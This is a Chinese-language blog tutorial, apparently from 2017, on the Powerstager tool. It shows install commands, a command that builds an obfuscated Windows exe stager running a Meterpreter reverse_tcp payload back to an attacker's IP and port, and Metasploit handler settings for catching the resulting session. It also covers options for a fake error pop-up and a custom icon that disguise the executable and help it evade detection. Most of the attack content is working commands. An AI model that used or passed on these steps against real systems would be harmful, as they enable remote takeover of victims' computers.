---
title:  Powerstager | Msf | kali linux 2017
date: 2017-10-06 22:39:41
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
github: https://github.com/z0noxz/powerstager
youtube :https://youtu.be/R_Xz_sGhHck
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/poststager.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


不合理使用此脚本所提供的功能而造成的任何直接或者间接的后果及损失， 均由使用者本人负责，即刻安全以及创作者不为此承担任何责任。 

<pre>
该脚本创建一个exe文件，可以下载所选的PowerShell有效内容，将其加载到内存中，并使用模糊的EC方法执行它。脚
本还将加密动态签名和一些额外的模糊处理。
这使得实际有效载荷可以间接执行，而不用受害者下载它，只能通过执行寄存器。攻击者可以例如在网络服务器上实现
逃避技术，托管有效载荷，而不是在破坏者本身。额外的方法允许将有效载荷嵌入到“stager”中并临时存储在磁盘上以
进行内存注入。
管理Windows时不仅功能强大，而且在利用Windows时也很强大。这个脚本利用了多个Windows功能，如其继承的
powerhell的信任，速记语法的解释，代码评估等等...
</pre>


安装过程
```markdown
git clone https://github.com/z0noxz/powerstager
cd powerstager
apt-get install python3
apt-get install mingw-w64
pip install names
```
&nbsp;
![enter description here][2]
&nbsp;

## 运行脚本
这里使用Python3 来运行脚本，否则会出错。
&nbsp;
![enter description here][3]
&nbsp;

## 简单编译
![enter description here][4]

```markdown
python3 powerstager.py -m -t win64 --lhost=192.168.1.103 --lport=4444 -o /root/demon.exe
```

这里用到的参数可以在帮助参数能找的到，我这里简单的介绍下，这一简短的命令
-m 参数 这里默认的使用的是msf的中 windows/meterperter/reverse_tcp 的payload
&nbsp;
![enter description here][5]
&nbsp;
 -t 参数代码的是windows的架构平台 可使用跟上 win64 /win32
 ![enter description here][6]

剩下的参数我就不用多说了 LHOST LPORT 指的是攻击者IP 和端口，以及-o 代表的输出路径
&nbsp;
![enter description here][7]

![enter description here][8]
&nbsp;
&nbsp;
&nbsp;
&nbsp;



## 开启MSF并到目标机运行

我这里简单的写了rc脚本，使用msf 去加载这脚本，下次使用它就改IP 和端口就可以了
并给它命名为
&nbsp;
![enter description here][9]
&nbsp;
使用msfconsole -r  加载这个脚本
&nbsp;
![enter description here][10]
&nbsp;
自动的帮我们加载我们设置好的msf的设置
&nbsp;

![enter description here][11]
&nbsp;
得到会话
&nbsp;
![enter description here][12]
&nbsp;
```markdown
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.103
run
```
![enter description here][13]


## 其他选项
其他选项 作者给我们提供了比较有意思的选项 一个是给exe增加图标，另一个是增加错误框的信息
--obfuscation  添加代码混淆
--fake-error="T::C"  添加弹框（填写一些错误弹框信息）
--icon  添加程序图标 (后面跟上图标路径)
![enter description here][14]

![enter description here][15]

![enter description here][16]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/284B54C9000962D18FBCC596F03CF3B4.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507371742082.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507372806653.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507372909535.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373369624.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373537360.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373617093.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507373649370.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374844089.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374118363.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507374936238.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507375081136.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507375067338.jpg
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376095417.jpg 
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376415707.jpg
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1507376396495.jpg 